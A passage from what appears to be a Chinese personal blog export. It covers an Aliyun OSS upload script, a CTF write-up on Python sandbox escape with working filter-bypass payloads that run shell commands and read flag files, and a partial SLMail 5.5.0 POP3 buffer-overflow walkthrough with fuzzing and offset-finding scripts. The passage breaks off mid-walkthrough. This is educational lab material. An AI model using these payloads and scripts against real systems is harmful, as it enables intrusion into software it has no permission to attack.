<li><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">(self,file_name,name)</span>:</span></span><br><span class="line">        bucket = oss2.Bucket(oss2.Auth(self.acc_id,self.acc_secret),self.endpoint,self.bucket_name)</span><br><span class="line">        data = bucket.put_object_from_file(key=<span class="string">'Blog/'</span>+ name,filename=<span class="string">'image/'</span>+ name, headers=<span class="keyword">None</span>, progress_callback=<span class="keyword">None</span>)</span><br><span class="line">        str = <span class="string">"https://xxxxxx.xx/"</span> + name</span><br><span class="line"> </span><br><span class="line">          shutil.rmtree(<span class="string">'image'</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>这里要在外部的 config文件中配置好阿里云提供的：Access Key ID、Access Key Secret、bucket_name、endpoint</p>
</li>
<li>说明：由于阿里云的SDK默认不支持文件夹，目录的概念，所以通过添加’/‘来表示在那个文件夹下；又由于没有返回文件访问连接地址的接口，所以通过固有的形式进行组合</li>
<li>shutil模块进行清空本地存放已经上传完的的图片（这样会删除文件夹，比遍历更加快速），这一点看个人了，可有可无，也可以使用os模块进行相应的操作。</li>
</ul>
<h3 id="设置阿里云OSS的接口信息"><a href="#设置阿里云OSS的接口信息" class="headerlink" title="设置阿里云OSS的接口信息"></a>设置阿里云OSS的接口信息</h3><ul>
<li><p>通过外部的config文件导入<img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-27/76961318.jpg" alt></p>
</li>
<li><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">        infoDict = &#123;&#125;</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">"config.conf"</span>,<span class="string">"r"</span>) <span class="keyword">as</span> file:</span><br><span class="line">            ApiInfo = file.readlines()</span><br><span class="line">            <span class="keyword">for</span> info <span class="keyword">in</span> ApiInfo:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">if</span> info != <span class="string">"\n"</span> <span class="keyword">and</span> info != <span class="string">""</span>:</span><br><span class="line">                        tmp = info.split(<span class="string">"="</span>)</span><br><span class="line">                        infoDict[tmp[<span class="number">0</span>].strip()] = tmp[<span class="number">1</span>].strip()</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">u"[-] 请按照要求配置config.conf"</span></span><br><span class="line">                    sys.exit()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">u"[-] 请在config.conf中配置阿里云 API信息"</span></span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="结果示例"><a href="#结果示例" class="headerlink" title="结果示例"></a>结果示例</h3><ul>
<li><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1522318333.02.png" alt></li>
<li><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-27/38823279.jpg" alt></li>
</ul>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ul>
<li>[OSS SDK-Python]:<a href="https://github.com/aliyun/aliyun-oss-python-sdk" target="_blank" rel="noopener">https://github.com/aliyun/aliyun-oss-python-sdk</a></li>
</ul>
<h3 id="更新说明"><a href="#更新说明" class="headerlink" title="更新说明"></a>更新说明</h3><blockquote>
<p>现在已经修改可以支持python3的环境，详情请看github</p>
</blockquote>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>编程</tag>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>python沙盒逃逸学习</title>
    <url>/2018/06/11/python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<blockquote>
<p>由于在现在的比赛中出现了沙盒逃逸这种题目，所以就针对python沙盒逃逸学习记录如下。python沙盒逃逸的思路就是题目删除了一些不安全的内建函数，模块导致环境的权限被降低，要利用python语言的特性进行限制的绕过。同时借助前几天赛中的沙盒逃逸演示一下。比赛中涉及的到Python沙盒逃逸往往是利用语言特性来逃逸，但是其实这只是从Python解释器的逃逸，从严格意义上说这是不完全的。从现实意义上来讲更进一步的是利用沙盒的逃逸来控制整个系统，Python的模块通常都是大量C代码的封装，这里面就有未被发现的内存破坏漏洞。所以比赛的题目只是一种思路，更多的还是要结合到实际生产环境中。</p>
</blockquote>
<h4 id="实例一"><a href="#实例一" class="headerlink" title="实例一"></a>实例一</h4><ol>
<li><p>实验脚本：题目的设置，删除一些内建函数（Python语言加载的时候会自动加载系统的内建模块，python2中是builtin，Python3中是builtins）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_secure</span><span class="params">()</span>:</span></span><br><span class="line">    UNSAFE = [<span class="string">'open'</span>,<span class="string">'file'</span>,<span class="string">'execfile'</span>,<span class="string">'compile'</span>,<span class="string">'reload'</span>,<span class="string">'__import__'</span>,<span class="string">'eval'</span>,<span class="string">'input'</span>]</span><br><span class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> UNSAFE:</span><br><span class="line">        <span class="keyword">del</span> __builtins__.__dict__[func]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> findall</span><br><span class="line"> </span><br><span class="line"><span class="comment">#Remove dangerous builtins</span></span><br><span class="line">make_secure()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Go Ahead,Expoit me &gt; ;D'</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"&gt;&gt;&gt;"</span>,</span><br><span class="line">        <span class="comment">#Read user input until the first whitespace character</span></span><br><span class="line">        inp = findall(<span class="string">'\S+'</span>,raw_input())[<span class="number">0</span>]</span><br><span class="line">        a = <span class="keyword">None</span></span><br><span class="line">        <span class="comment">#Set a to the result from executing the user input</span></span><br><span class="line">        <span class="keyword">exec</span> <span class="string">'a='</span>+inp</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'&gt;&gt;&gt;'</span>,a</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Exception:'</span>,e</span><br><span class="line"><span class="comment">#后面这一段主要是将结果以字符串的形式操作并显示</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>脚本运行结果：（环境的限制权限非常低）这里其实就是模拟Python的命令行界面，然后进行相应的操作，只是将一些内建函数删除了，所以无法调用系统命令等等<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525428212.69.png" alt></p>
</li>
<li><p>正常情况下Python的使用可以调用OS等模块，就可以进行系统命令的调用和文件操作等等：但是经过限制以后的环境就不可以调用了，因此不能调用系统命令拿到flag<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525428524.0.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525428600.48.png" alt></p>
</li>
<li><p>由于删除了对应的内建函数，所以我们要利用Python的特性来绕过这种限制：<strong>Python中可以利用file来read文件</strong> 但是我们可以发现直接用file这种方式也是被限制了的，所以利用对象的概念，通过元组来加载：（有一个知识点：<strong>bases</strong> : 类的所有父类构成元素（包含了一个由所有父类组成的元组））<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525429208.95.png" alt></p>
</li>
<li><p>通过将所有父类组成的元组显示出来以后可以找到file在第40个，然后我们可以通过硬编码的方式调用file加载文件找到flag： <code>().__class__.__bases__[0].__subclasses__()[40](&#39;./flag.txt&#39;).read()</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525429504.92.png" alt></p>
</li>
</ol>
<h3 id="实例二"><a href="#实例二" class="headerlink" title="实例二"></a>实例二</h3><ol>
<li><p>首先还是贴上环境的脚本，前提条件和实例一差不多：（不同的是这里能够执行的内建函数只有输入输出，与实例一不同的还有就是这里不回显数据  ）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Welcome to my python sandbox! Enter commands below!"</span></span><br><span class="line"> </span><br><span class="line">banned = [<span class="string">'import'</span>,<span class="string">'exec'</span>,<span class="string">'eval'</span>,<span class="string">'pickle'</span>,<span class="string">'os'</span>,<span class="string">'subprocess'</span>,<span class="string">'kevin sucks'</span>,<span class="string">'input'</span>,<span class="string">'banned'</span>,<span class="string">'cry sum more'</span>,<span class="string">'sys'</span>]</span><br><span class="line"> </span><br><span class="line">targets = __builtins__.__dict__.keys()</span><br><span class="line">targets.remove(<span class="string">'raw_input'</span>)</span><br><span class="line">targets.remove(<span class="string">'print'</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> targets:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[x]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"&gt;&gt;&gt;"</span>,</span><br><span class="line">        data = raw_input()</span><br><span class="line">        <span class="keyword">for</span> no <span class="keyword">in</span> banned:</span><br><span class="line">            <span class="keyword">if</span> no.lower() <span class="keyword">in</span> data.lower():</span><br><span class="line">                <span class="comment">#将输入的字符转换为小写和banned中的字符转换为小写比较</span></span><br><span class="line">                print(<span class="string">"Permission Denied"</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">exec</span> data</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">''</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>环境运行结果如下：<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525440081.27.png" alt></p>
</li>
<li><p>思路与实例一还是一样，都是使用所有父类组成的元组，这里要使用到catch_warnings类（索引在59），进行命令执行 <code>print ().__class__.__bases__[0].__subclasses__()</code>    <code></code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525440331.12.png" alt></p>
<p><code>().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;sy&#39;+&#39;stem&#39;](&#39;ls&#39;)</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525440491.92.png" alt></p>
</li>
<li><p>经过测试以后发现这里其实可以不用执行59的那个子类，因为没有禁用print函数，当然这里的59这个子类可以用到实例一中进行ls的调用</p>
<p><code>print ().__class__.__bases__[0].__subclasses__()[40](&#39;./flag.txt&#39;).read()</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525440660.03.png" alt></p>
</li>
</ol>
<h3 id="实例三"><a href="#实例三" class="headerlink" title="实例三"></a>实例三</h3><ol>
<li><p>实验环境代码如下：（这里用Python3写的，与前两个相比，这里先删除了两个危险的函数，然后对其他许多函数做了过滤，还对一些字符，如’.’都进行了过滤）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> sys, cmd, os</span><br><span class="line"> </span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'__import__'</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'eval'</span>]</span><br><span class="line"> </span><br><span class="line">intro= <span class="string">"""</span></span><br><span class="line"><span class="string">   pwnhubcuit</span></span><br><span class="line"><span class="string">   pwneverything</span></span><br><span class="line"><span class="string">   Rules:</span></span><br><span class="line"><span class="string">        -No import</span></span><br><span class="line"><span class="string">        -No ...</span></span><br><span class="line"><span class="string">        -No flag</span></span><br><span class="line"><span class="string"> """</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute</span><span class="params">(command)</span>:</span></span><br><span class="line">    exec(command, globals())</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jail</span><span class="params">(cmd.Cmd)</span>:</span></span><br><span class="line">    prompt    = <span class="string">'&gt;&gt;&gt; '</span></span><br><span class="line">    filtered   =<span class="string">'\'|.|input|if|else|eval|exit|import|quit|exec|code|const|vars|str|chr|ord|local|global|join|format|replace|translate|try|except|with|content|frame|back'</span>.split(<span class="string">'|'</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_EOF</span><span class="params">(self, line)</span>:</span></span><br><span class="line">        sys.exit()</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">emptyline</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> cmd.Cmd.emptyline(self)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">default</span><span class="params">(self, line)</span>:</span></span><br><span class="line">        sys.stdout.write(<span class="string">'\x00'</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">postcmd</span><span class="params">(self, stop, line)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> any(f <span class="keyword">in</span> line <span class="keyword">for</span> f <span class="keyword">in</span> self.filtered):</span><br><span class="line">            print(<span class="string">"You are a big hacker!!!"</span>)</span><br><span class="line">            print(<span class="string">"Go away"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                execute(line)</span><br><span class="line">            <span class="keyword">except</span> NameError:</span><br><span class="line">                print(<span class="string">"NameError: name'%s' is not defined"</span> % line)</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                print(<span class="string">"Error: %s"</span> %line)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> cmd.Cmd.postcmd(self, stop,line)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        Jail().cmdloop(intro)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        print(<span class="string">"\rSee you next time!"</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>所以这里就没有办法使用前面说的利用子类进行系统的调用，这里通过获取系统函数地址进行绕过：</p>
<p><code>print(getattr(os, &quot;system&quot;)(&quot;ls&quot;))</code></p>
<p><code>print(getattr(os, &quot;system&quot;)(&quot;cat flag&quot;))</code> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525442349.25.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525442706.14.png" alt></p>
</li>
</ol>
<blockquote>
<p>以上三个实例就是利用Python作为脚本语言的特性来逃逸</p>
</blockquote>
<h3 id="实例四"><a href="#实例四" class="headerlink" title="实例四"></a>实例四</h3><blockquote>
<p>拿最近一次比赛中的沙盒逃逸来演示一下。</p>
</blockquote>
<ol>
<li><p>拿到赛题以后nc连接一下并输入一些语句进行测试：（也是许多函数被限制且不回显，经过测试发现是Python2写的环境并且没有过滤‘ . ’）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525443353.83.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525443493.14.png" alt></p>
</li>
<li><p>这里和我们前面的练习不一样，这里必须要调用系统命令ls来看一下存放flag的文件，找到一个和getattr函数类似的函数getattribute</p>
<p><code>print ().__class__.__bases__[0].__getattribute__(&#39;o&#39;+&#39;s&#39;,&#39;sy&#39;&#39;stem&#39;)(&#39;l&#39;&#39;s&#39;)</code>  发现可以使用单引号调用参数</p>
<p><code>().__class__.__bases__[0].__getattribute__(__import__(&#39;o&#39;+&#39;s&#39;),&#39;sy&#39;&#39;stem&#39;)(&#39;l&#39;&#39;s&#39;)</code> 构造第二个payload，尝试使用导入os模块的方法调用系统命令，结果失败，过滤了os:<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525443785.45.png" alt></p>
<p>这个时候我们换一下思路，调用子类中的函数catch_warnings，在第59个，构造paylad:</p>
<p><code>print [].__class__.__base__.__subclasses__()[59].__init__.__getattribute__(&#39;func_global&#39; + &#39;s&#39;)[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;popen&#39;](&#39;l&#39;&#39;s&#39;).read</code> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525444594.33.png" alt></p>
<p>成功列出了目录，经过测试flag在home/ctf目录下：</p>
<p><code>print [].__class__.__base__.__subclasses__()[59].__init__.__getattribute__(&#39;func_global&#39; + &#39;s&#39;)[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;popen&#39;](&#39;l&#39;&#39;s /home&#39;).read()</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525445718.2.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525445847.25.png" alt></p>
<p>然后我们加上getattribute构造payload：</p>
<p><code>print [].__class__.__base__.__subclasses__()[59].__init__.__getattribute__(&#39;func_global&#39; + &#39;s&#39;)[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;popen&#39;](&#39;c&#39;&#39;at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb&#39;).read()</code> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525446030.23.png" alt></p>
</li>
</ol>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote>
<p>利用语言特性来进行解释器的逃逸，其实就是绕过python沙盒内部导入模块的白名单；这里我理解为它限制的是语言中最直接的模块、函数的调用，而我们利用的是通过封装的类，以及派生出的子类调用，实现相同的功能。还有不得不说的一点，结合生产环境，通过内存破坏、溢出等方式实现沙盒的的逃逸要理解很多东西，涉及到二进制、fuzzy等等，所以要通过不断的学习才可以综合的利用。由于水平有限，这里只能做到语言解释器的沙盒逃逸，而不是系统层面的。下面给出一个讲利用内存破坏实现Python沙盒逃逸的链接。</p>
</blockquote>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>CTF</tag>
        <tag>沙盒逃逸</tag>
      </tags>
  </entry>
  <entry>
    <title>一次windows缓冲区溢出复现</title>
    <url>/2018/06/09/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</url>
    <content><![CDATA[<blockquote>
<p>缓冲区是内存中的一个片段，我们使用程序；在程序中输入一些参数、变量，这些都会先放在缓冲区中，然后通过CPU的调用、处理，然后再由计算机反馈出来。</p>
</blockquote>
<h2 id="程序的漏洞从哪里来："><a href="#程序的漏洞从哪里来：" class="headerlink" title="程序的漏洞从哪里来："></a>程序的漏洞从哪里来：</h2><ul>
<li>罪恶的根源：变量</li>
<li>数据与代码边界不清（程序没有严格的限定）</li>
<li>由于控制不严会造成程序被严重的破坏</li>
<li>最简单漏洞原理——shell脚本</li>
</ul>
<ol>
<li><p>通过一个最简单的shell脚本来体现漏洞的由来：</p>
<ul>
<li><p>这个脚本本意是将用户输入的字符显示出来，从程序的目的来看没有问题</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#！/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> $</span><br></pre></td></tr></table></figure>
</li>
<li><p>但是这个程序没有做数据和命令上的过滤，通过一些特殊字符的构造就可以执行命令（比如； &amp;&amp; ||）</p>
<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-20/39703071.jpg" alt></p>
</li>
<li><p>上面的结果就是一个简单的漏洞产生的原理，假如说这是一个服务器，攻击者就可以使用nc开一个监听端口，然后将shell重定向，这样就会直接控制服务器</p>
</li>
</ul>
</li>
<li><p>缓冲区溢出：</p>
<ul>
<li>当缓冲区边界限制不严格时，由于变量传入畸形数据或程序运行错误，导致缓冲区被“撑爆”，从而覆盖了相邻内存区域的数据。</li>
<li>成功修改内存数据、可以造成进程劫持、执行恶意代码、获得服务器权限等后果。</li>
</ul>
</li>
</ol>
<h2 id="如何发现漏洞："><a href="#如何发现漏洞：" class="headerlink" title="如何发现漏洞："></a>如何发现漏洞：</h2><ul>
<li>源码审计（首先你得能接触到源码）</li>
<li>逆向工程</li>
<li>模糊测试<ul>
<li>向程序堆栈发送随机、半随机的数据，根据存在内存变化判断溢出  （完全随机的不好判断）</li>
<li>数据生成器：生成随机、半随机的数据  （工具）</li>
<li>测试工具：识别溢出漏洞                        （工具，主要使用一些动态调试工具）</li>
</ul>
</li>
</ul>
<h2 id="Windows缓冲区溢出"><a href="#Windows缓冲区溢出" class="headerlink" title="Windows缓冲区溢出"></a>Windows缓冲区溢出</h2><ul>
<li>FUZZER<ul>
<li>SLMail 5.5.0 Mail Server      （一个Windows下的存在缓冲区溢出的服务端）</li>
<li>ImmunityDebugger_1_85setup.exe    （一个调试工具，比OD的自动化程度高一些）</li>
<li>mona.py                                              （辅助脚本）</li>
<li>环境：Windows XP（需要将SLMail 、调试工具部署好）<ul>
<li>安装SLMail按照提示安装完查看端口、服务（smtp、pop3等）是否开放</li>
<li>安装调试工具，如果没有Python2.7环境它会自动安装</li>
<li>将mono.py放在ImmunityDebugger的Pycommands文件夹中</li>
</ul>
</li>
<li>SLMail 5.5.0 Mail Server<ul>
<li>pop3  pass命令存在缓冲区溢出漏洞</li>
<li>无需身份验证实现远程代码执行</li>
<li>DEP：阻止代码从数据页被执行      （Windows的一种安全防护机制）</li>
<li>ASLR：随机内存地址加载执行程序和DLL，每次重启地址变化 （Windows的一种安全防护机制）</li>
</ul>
</li>
</ul>
</li>
<li><p>pop3</p>
<ul>
<li><p>最简单的 <figure class="highlight"><figcaption><span>110端口```</span></figcaption><table><tr><td class="code"><pre><span class="line">- 了解未知协议</span><br><span class="line">  - wireshark</span><br><span class="line"></span><br><span class="line">  - RFC</span><br><span class="line"></span><br><span class="line">  - 通过一个简单的Python脚本进行110端口的连接：</span><br><span class="line"></span><br><span class="line">    ```pytho<span class="symbol">n</span></span><br><span class="line">    #!/usr/bin/python</span><br><span class="line">    import socket</span><br><span class="line"> </span><br><span class="line">    s = socket.socket<span class="comment">(socket.AF_INET,socket.SOCK_STREAM)</span></span><br><span class="line">    try:</span><br><span class="line">        print "\nSending evil buffer..."</span><br><span class="line">        s.connect(('192.168.111.137',110))</span><br><span class="line">        data = s.recv<span class="comment">(1024)</span></span><br><span class="line">        print data</span><br><span class="line"> </span><br><span class="line">        s.send('USER admin' + '\r\n')</span><br><span class="line">        data = s.recv<span class="comment">(1024)</span></span><br><span class="line">        print data</span><br><span class="line"> </span><br><span class="line">        s.send('PASS admin\r\n')</span><br><span class="line">        data = s.recv<span class="comment">(1024)</span></span><br><span class="line">        print data</span><br><span class="line"> </span><br><span class="line">        s.close<span class="comment">()</span></span><br><span class="line">        print "\nDone!"</span><br><span class="line">    except:</span><br><span class="line">        print "Could not connect to POP3!"</span><br></pre></td></tr></table></figure></p>
<ul>
<li><p>这里已知SLMail 5.5.0的pass存在缓冲区溢出漏洞，在实际测试用就需要一步步调试</p>
<ul>
<li><p>测试pass命令接收到大量数据时是否合法</p>
</li>
<li><p>EIP寄存器存放下一条指令的地址</p>
</li>
<li><p>2.py （通过一个简单的Python脚本来验证SLMail 5.5.0的pass命令存在存在缓冲区漏洞）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">buffer = [<span class="string">"A"</span>]</span><br><span class="line">counter = <span class="number">100</span></span><br><span class="line"><span class="keyword">while</span> len(buffer) &lt;= <span class="number">50</span>:</span><br><span class="line">    buffer.append(<span class="string">"A"</span>*counter)</span><br><span class="line">    counter = counter + <span class="number">200</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> string <span class="keyword">in</span> buffer:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Fuzzing PASS with %s bytes "</span> % len(string)</span><br><span class="line">    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    connect = s.connect((<span class="string">'192.168.111.137'</span>,<span class="number">110</span>))</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">"USER test"</span> + <span class="string">'\r\n'</span>)</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'PASS '</span> + string + <span class="string">'\r\n'</span>)</span><br><span class="line">    s.send(<span class="string">'QUIT\r\n'</span>)</span><br><span class="line">    s.close()</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#向目标的110端口发送大量的A</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>首先确保开启了pop3：<img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/49054008.jpg" alt></p>
</li>
<li><p>打开ImmunityDebugger并且开始调试pop3服务的这个进程，查看端口状态的时候可以看到PID是2696<img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/51147695.jpg" alt><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/87550059.jpg" alt></p>
</li>
<li><p>准备就绪以后启动脚本发送数据：</p>
<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/83362379.jpg" alt></p>
</li>
<li><p>当数据到2700bytes的时候会发现EIP EBP寄存器都是4141 assic码就是A，这个时候发送大量的A造成了PASS指定的溢出，证明溢出确实存在：</p>
<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/89254562.jpg" alt></p>
</li>
<li><p>溢出存在，如果EIP指令可以修改，就可以通过一些构造，就可能执行一些系统命令；还有一种可能，通过修改EIP的地址，将指令指向一个内存地址空间，通过缓冲区溢出添加shellcode，然后控制服务器。</p>
</li>
</ul>
</li>
<li><p>通过PASS缓冲区溢出漏洞的验证，发现在数据发送到2900bytes的时候溢出</p>
<ul>
<li><p>通过第三个脚本精确的找到溢出的四个字节</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer = <span class="string">'A'</span> * <span class="number">2700</span>     <span class="comment">#因为前面是从2700开始溢出的</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nSending evil buffer..."</span></span><br><span class="line">    s.connect((<span class="string">'192.168.111.137'</span>,<span class="number">110</span>))</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'USER test'</span> + <span class="string">'\r\n'</span>)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'PASS '</span> + buffer + <span class="string">'\r\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer = <span class="string">'A'</span> * <span class="number">2600</span>     <span class="comment">#改为2800确定是否在 2800-2900之间</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nSending evil buffer..."</span></span><br><span class="line">    s.connect((<span class="string">'192.168.111.137'</span>,<span class="number">110</span>))</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'USER test'</span> + <span class="string">'\r\n'</span>)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'PASS '</span> + buffer + <span class="string">'\r\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>现在再看POP3的进程，仅管还是溢出了，但是EIP不是全A的状态了，就证明精确溢出的四个字节在2600-2700：</p>
<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/65934922.jpg" alt></p>
</li>
<li><p>更加精确定位</p>
<ul>
<li><p>二分法</p>
</li>
<li><p>唯一字符串法：如果可以生成唯一的字符串，就可以精确定位是那四个字节填充了EIP</p>
<ul>
<li><p>通过一个脚本生成</p>
